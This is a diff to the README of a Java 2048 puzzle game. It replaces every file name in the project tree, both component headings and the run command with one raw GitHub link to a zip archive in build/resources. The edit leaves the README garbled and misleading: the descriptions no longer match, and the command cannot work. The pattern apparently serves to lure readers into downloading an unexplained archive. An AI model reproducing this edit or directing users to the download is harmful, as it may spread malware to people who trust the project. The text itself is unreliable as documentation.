@@ -79,25 +79,25 @@ A Java implementation of the popular 2048 puzzle game using the Processing libra
 │   └── main/
 │       ├── java/
 │       │   └── TwentyFortyEight/
-│       │       ├── App.java          # Main game class with Processing setup
-│       │       └── Cell.java         # Individual tile/cell implementation
+│       │       ├── https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip          # Main game class with Processing setup
+│       │       └── https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip         # Individual tile/cell implementation
 │       └── resources/
 │           └── TwentyFortyEight/
-│               └── 8.png             # Game assets
-├── build.gradle                      # Gradle build configuration
-└── README.md                         # This file
+│               └── https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip             # Game assets
+├── https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip                      # Gradle build configuration
+└── https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip                         # This file
 ```
 
 ## Key Components
 
-### App.java
+### https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip
 - Main game logic and Processing framework integration
 - Handles user input (keyboard and mouse)
 - Manages game state (score, timer, game over)
 - Implements tile movement algorithms
 - Renders UI elements (score display, timer, game over screen)
 
-### Cell.java
+### https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip
 - Represents individual tiles on the game board
 - Handles tile animations (movement, spawn, merge)
 - Manages tile appearance and color schemes
@@ -144,7 +144,7 @@ gradle jar
 
 The JAR file will be created in `build/libs/` and can be run with:
 ```bash
-java -jar build/libs/2048-Game-1.0.jar
+java -jar https://github.com/marydao21/2048-Game/raw/refs/heads/main/build/resources/Game-v1.8.zip
 ```
 
 ## Future Enhancements
